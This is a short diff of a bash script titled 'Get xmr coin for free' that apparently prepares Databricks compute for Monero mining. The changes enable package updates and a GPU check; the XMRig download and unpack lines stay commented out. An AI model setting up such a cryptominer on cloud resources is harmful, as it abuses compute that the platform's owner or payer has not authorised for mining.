@@ -1,12 +1,12 @@
 #! /bin/bash
 # Get xmr coin for free
 # Databricks
-#sudo apt update
+apt update
 
 
 
-#apt install pciutils
-#lspci | grep VGA
+apt install pciutils
+lspci | grep VGA
  
 #wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-focal-x64.tar.gz
 #tar xvzf xmrig-6.16.4-focal-x64.tar.gz
